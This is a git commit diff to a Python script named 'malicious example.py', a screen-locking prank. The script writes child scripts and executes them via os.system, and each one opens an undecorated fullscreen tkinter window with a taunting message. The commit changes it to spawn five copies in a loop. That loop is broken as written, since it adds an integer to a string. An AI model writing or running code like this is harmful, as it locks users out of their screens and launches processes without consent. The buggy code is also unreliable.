a1de6d1dc5278a6df51fdc2c15f9c5e0beb02092
redninja9854 <100790587+redninja9854@users.noreply.github.com>
2022-05-25 19:52:30 +0100

    Update malicious example.py

--- malicious example.py
+++ malicious example.py
@@ -1,9 +1,11 @@
 import os
 import tkinter as tk
 from tkinter.messagebox import showinfo
-with open ("test.py", "w") as file:
-    file.write("import os\nimport tkinter as tk\nfrom tkinter.messagebox import showinfo\nfullscreen = tk.Tk()\nshowinfo(message=\"I did warn you xD\")\nfullscreen.attributes(\"-fullscreen\", True)\nfullscreen.overrideredirect(True)\nfullscreen.mainloop()")
-os.system("test.py")
+for i in range (0, 5, 1):
+    fileName = "test" + i + ".py"
+    with open (fileName, "w") as file:
+        file.write("import os\nimport tkinter as tk\nfrom tkinter.messagebox import showinfo\nfullscreen = tk.Tk()\nshowinfo(message=\"I did warn you xD\")\nfullscreen.attributes(\"-fullscreen\", True)\nfullscreen.overrideredirect(True)\nfullscreen.mainloop()")
+    os.system(fileName)
 fullscreen = tk.Tk()
 showinfo(message="why?")
 fullscreen.attributes("-fullscreen", True)
